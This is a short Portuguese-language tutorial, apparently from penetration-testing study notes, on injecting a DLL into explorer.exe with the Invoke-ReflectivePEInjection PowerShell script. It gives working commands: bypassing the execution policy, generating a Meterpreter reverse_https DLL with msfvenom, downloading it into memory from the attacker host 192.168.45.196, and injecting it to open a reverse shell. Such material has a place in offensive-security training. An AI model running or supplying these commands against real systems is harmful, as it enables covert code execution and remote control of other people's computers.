Vamos usar o código para DLL Injection no PowerShell de Invoke-ReflectivePEInjection, desenvolvido pela comunidade. Esse script evita que o assembly seja escrito no disco, ele tem dois modos diferentes:

1. Carregar uma DLL refletida ou .EXE no mesmo processo
2. Carregar a DLL em um processo remoto

Para executar os comando necessários abrimos o powershell com -ep bypass para permitir rodar scripts, depois vamos carregar a DLL na memória (em uma variável) e capturar o Process ID do Explorer.exe

```powershell
PowerShell -ep Bypass

#feito com msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.196 LPORT=443 -f dll -o met.dll
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.196/met.dll')

$procid = (Get-Process -Name explorer).Id
```


também podemos ver o Process ID manualmente com “Echo (Get-Process -Name explorer).Id”

</aside>

Para usar o código do Invoke-ReflectivePEInjection, precisamos primeiramente importar ele com `Import-Module` no terminal e na sequência podemos fornecer os valores para -PEBytes e -ProcID com nossas variáveis

Ao executar, a DLL é carregada na memória e o ShellCode de met.dll que foi gerado com MSFVENOM nos retorna um revshell

```powershell
Import-Module .\Invoke-ReflectivePEInjection.ps1

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

O script produz um erro no final mas não afeta a funcionalidade
